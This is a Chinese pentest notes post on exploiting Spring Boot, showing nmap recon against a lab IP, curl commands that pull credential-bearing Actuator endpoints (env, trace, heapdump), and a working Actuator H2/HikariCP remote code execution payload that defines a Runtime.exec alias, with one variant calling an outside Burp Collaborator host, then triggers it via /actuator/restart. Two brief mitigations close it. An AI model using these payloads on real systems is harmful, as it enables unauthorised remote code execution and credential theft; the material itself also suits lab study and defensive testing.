---
top:                                 #是否置顶，值越大，越靠顶部
title: Spring                  # 文章标题
date: 15/12/2020                     # 文章写作日期

encrypt: false                       # 是否加密
enc_pwd: askding                     # 加密密码

categories:                          # 文章分类
    - Kali
    - Exploit

tags:                                # 文章标签

layout:   # 默认布局post,可选draft
---
编写进度
- [x] 



推荐资料：
- [SpringBootVulExploit](https://github.com/LandGrey/SpringBootVulExploit)
- [Spring 框架漏洞集合](https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/)
- [Spring Boot Actuator H2 RCE复现](https://www.cnblogs.com/cwkiller/p/12829974.html)


- [Spring Boot Actuator(eureka xstream deserialization RCE)](https://www.jianshu.com/p/91a5ca9b7c1c)

**Spring** 是为解决企业应用开发的复杂性而创建的一个开源框架。
	主要的设计思想是有两个：
- `控制反转IOC` 
IOC是一种设计思想，将原本在程序中自己手动创建对象的控制权，交由 Spring 框架来管理。
- `面向方面编程AOP` 
利用一种称为"横切"的技术，剖解开封装的对象内部，并将那些影响了多个类的公共行为封装到一个可重用模块，并将其命名为"Aspect"，即切面。

## 信息收集
```zsh
nmap -Pn -T4  -p 8080  -sV --version-all 192.168.79.28
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-15 17:18 CST
Nmap scan report for 192.168.79.28
Host is up (0.00019s latency).

PORT     STATE SERVICE    VERSION
8080/tcp open  http-proxy
```
访问不存在的页面包含以下信息证明使用了Spring Boot
```html
Whitelabel Error Page

This application has no explicit mapping for /error, so you are seeing this as a fallback.
Tue Dec 15 09:35:57 GMT 2020
There was an unexpected error (type=Not Found, status=404).
No message available
```
Spring API信息获取
```zsh
curl -v 'http://192.168.79.28:8080/trace'  # 获取用户认证字段
curl -v 'http://192.168.79.28:8080/env'    # 服务器配置信息，包括数据库
curl -v 'http://192.168.79.28:8080/health'  # 泄漏git项目地址
curl -v 'http://192.168.79.28:8080/heapdump' # 泄漏后台用户信息
curl -v 'http://192.168.79.28:8080/'
curl -v 'http://192.168.79.28:8080/'
curl -v 'http://192.168.79.28:8080/'
curl -v 'http://192.168.79.28:8080/'

## Spring Boot Actuator H2 with HikariCP远程代码执行

**Actuator** 是 Spring Boot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。  

Actuator 配置不当导致应用系统监控信息泄露对应用系统及其用户的危害是巨大的

更多[Spring Boot Rest API](https://howtodoinjava.com/spring-boot2/rest/rest-api-example/)

```zsh
 curl  'http://192.168.79.28:8080/actuator'  # 查看actuator下的端点actuator/env
{"_links":{"self":{"href":"http://192.168.79.28:8080/actuator","templated":false},"env-toMatch":{"href":"http://192.168.79.28:8080/actuator/env/{toMatch}","templated":true},"env":{"href":"http://192.168.79.28:8080/actuator/env","templated":false},"restart":{"href":"http://192.168.79.28:8080/actuator/restart","templated":false}}}%
```
发送EXP
```json
POST /actuator/env HTTP/1.1

content-type: application/json

{"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException();}'; CALL EXEC('/Applications/Calculator.app/Contents/MacOS/Calculator');"}


POST /actuator/restart HTTP/1.1

content-type: application/json

{}

```

```zsh
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS EXEC AS CONCAT(\'String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new\',\' java.util.Scanner(Runtime.getRun\',\'time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }\');CALL EXEC(\'curl http://x.burpcollaborator.net\');\"}' 'http://192.168.79.28:8080/actuator/env'

#发送exp
curl -X 'POST' -H 'Content-Type: application/json' 'http://192.168.79.28:8080/actuator/restart'   # 触发exp
```





### 安全措施
1. 引入 security 依赖，打开安全限制并进行身份验证
2. 设置单独的 Actuator 管理端口并配置不对外网开放
